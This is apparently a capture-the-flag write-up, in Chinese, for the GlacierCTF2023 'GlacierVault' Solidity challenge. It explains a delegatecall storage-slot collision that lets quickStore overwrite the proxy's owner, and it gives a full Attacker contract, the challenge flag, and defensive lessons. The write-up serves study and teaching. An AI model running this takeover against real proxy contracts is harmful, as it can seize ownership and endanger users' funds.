# GlacierCTF2023 - GlacierVault

## 题目简述

`Guardian` 是一个把未知调用通过 `delegatecall` 转给 `GlacierVault` 的代理。目标是令 `Guardian.asleep == true`；直接 `putToSleep()` 只允许 `owner` 调用，而 `punch()` 要求超过一千万 ether。关键在于代理与实现合约的存储布局完全不兼容。

## 解题过程

`Guardian` 的存储布局中，`asleep` 与 `implementation_addr` 打包在 slot 0，`people_mauled` 位于 slot 1，`owner` 位于 slot 2。`GlacierVault` 则以两个 mapping 占据 slot 0、1，`quickstore1` 恰好位于 slot 2。

通过 Guardian 地址调用不存在的 `quickStore(uint8,uint256)`，fallback 会在 Guardian 的存储上下文中执行实现代码。于是

```solidity
quickStore(0, uint256(uint160(address(this))))
```

写入的不是实现合约自己的 `quickstore1`，而是把 `Guardian.owner` 覆盖成攻击合约地址。随后由攻击合约直接调用 `putToSleep()` 即可通过权限检查：

```solidity
contract Attacker {
    GlacierVault proxyAsVault;
    Guardian guardian;

    constructor(address target) {
        proxyAsVault = GlacierVault(target);
        guardian = Guardian(payable(target));
    }

    function attack() external payable {
        require(msg.value == 1337);
        proxyAsVault.quickStore{value: 1337}(
            0, uint256(uint160(address(this)))
        );
        guardian.putToSleep();
    }
}
```

`asleep` 被置真后获得：

```text
gctf{h3's_sl33pIng_BuT_ju5t_4_n0w}
```

## 方法总结

`delegatecall` 使用调用者的存储，而不是实现合约的存储。代理升级或委托执行必须保持精确的 slot 布局，并限制可达实现与初始化入口；否则实现中的普通写入函数可以覆盖代理的 owner、implementation 或其它安全关键状态。
